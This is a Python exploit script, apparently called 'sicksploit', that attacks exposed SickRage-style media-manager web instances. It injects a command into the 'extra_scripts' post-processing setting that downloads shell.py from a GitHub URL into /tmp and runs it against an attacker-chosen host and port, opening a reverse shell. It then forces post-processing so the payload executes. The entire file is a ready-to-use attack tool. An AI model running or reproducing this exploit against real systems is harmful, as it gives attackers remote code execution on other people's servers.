import requests
import argparse


def get_args():
    parser = argparse.ArgumentParser(description="Exploit open instances of Sick*")
    parser.add_argument('URL', metavar="URL", help="The URL of the sick* instance to exploit - host:port")
    parser.add_argument('RHOST', metavar="RHOST", help="The IP where the exploited instance should connect to.")
    parser.add_argument('RPORT', metavar="RPORT", help="The port where the exploited instance should connect to.")
    args = parser.parse_args()
    return args


def exploit(conf, base_url, rhost, rport):
    print "[+] Starting to exploit %s." % base_url
    url = "%s/config/postProcessing/savePostProcessing" % base_url
    current_dir = conf['tv_download_dir']
    current_extensions = conf['allowed_extensions']
    payload = '/usr/bin/wget https://raw.githubusercontent.com/Sudneo/sicksploit/master/shell.py -O ' \
              '/tmp/shell|/usr/bin/python /tmp/shell %s %s' % (rhost, rport)
    print "[+] Injecting payload: %s" % payload
    keys = {
            'allowed_extensions': current_extensions,
            'alt_unrar_tool': 'unrar',
            'autopostprocessor_frequency': '10',
            'delete_non_associated_files': 'on',
            'extra_scripts': payload,
            'file_timestamp_timezone': 'network',
            'kodi_12plus_data': '0|0|0|0|0|0|0|0|0|0',
            'kodi_data': '0|0|0|0|0|0|0|0|0|0',
            'mede8er_data': '0|0|0|0|0|0|0|0|0|0',
            'mediabrowser_data': '0|0|0|0|0|0|0|0|0|0',
            'naming_abd_pattern': '%SN+-+%A.D+-+%EN',
            'naming_anime': '3',
            'naming_anime_multi_ep': '1',
            'naming_anime_pattern': 'Season+%0S/%SN+-+S%0SE%0E+-+%EN',
            'naming_multi_ep': '1',
            'naming_pattern': 'Season+%0S/%SN+-+S%0SE%0E+-+%EN',
            'naming_sports_pattern': '%SN+-+%A-D+-+%EN',
            'nfo_rename': 'on',
            'postpone_if_sync_files': 'on',
            'process_automatically': 'on',
            'process_method': 'copy',
            'rename_episodes': 'on',
            'sony_ps3_data': '0|0|0|0|0|0|0|0|0|0',
            'sync_files': '!sync,lftp-pget-status,bts,!qb,!qB',
            'tivo_data': '0|0|0|0|0|0|0|0|0|0',
            'tv_download_dir': current_dir,
            'unpack': '0',
            'unpack_dir': '',
            'unrar_tool': 'unrar',
            'use_icacls': 'on',
            'wdtv_data': '0|0|0|0|0|0|0|0|0|0'
            }
    response = requests.post(url, data=keys)
    if response.status_code != 200:
        print "[-] Exploit failed. Is %s up?" % base_url
        exit(0)
    else:
        print "[+] Exploit succeeded."


def trigger_post_processing(base_url, process_dir):
    print "[+] Trigger a manual post-processing of %s to execute the injected payload." % process_dir
    params = {'force': 'on', 'proc_dir': process_dir, 'process_method': 'copy'}
    url = "%s/home/postprocess/processEpisode" % base_url
    response = requests.post(url, data=params)
    if response.status_code != 200:
        print "[-] Error in triggering post processing. Exploit might still succeed, auto post processing every 10m."
    else:
        print "[+] Manual post processing correctly scheduled. It might take a few minutes to actually get executed."


def get_current_conf(base_url):
    print "[+] Trying to get current values for some config items not to break post-processing."
    url = "%s/config/postProcessing/" % base_url
    keys = {'allowed_extensions': '', 'tv_download_dir': ''}
    response = requests.get(url)
    if response.status_code != 200:
        print "[-] Request failed. Is %s up?" % base_url
        exit(1)
    text = response.content
    for line in text.split("\n"):
        for k in keys:
            if k in line:
                items = line.split(" ")
                for i in items:
                    if "value" in i:
                        conf_item = i.split("=")[1].lstrip("\"").rstrip("\"")
                        keys[k] = conf_item
                        print "[+] Found %s: %s " % (k, conf_item)
    if keys['allowed_extensions'] is None or keys['tv_download_dir'] is None:
        print['! Request succeeded, but probably the post-processing is broken and the exploit will not be triggered.']
    return keys


def main():
    # Get arguments
    args = get_args()
    url = args.URL
    rhost = args.RHOST
    rport = args.RPORT
    # Get current configuration not to break the post processing
    conf = get_current_conf(url)
    # Apply post-processing configuration to include malicious extra-scripts
    exploit(conf, url, rhost, rport)
    trigger_post_processing(url, conf['tv_download_dir'])


if __name__ == '__main__':
    main()


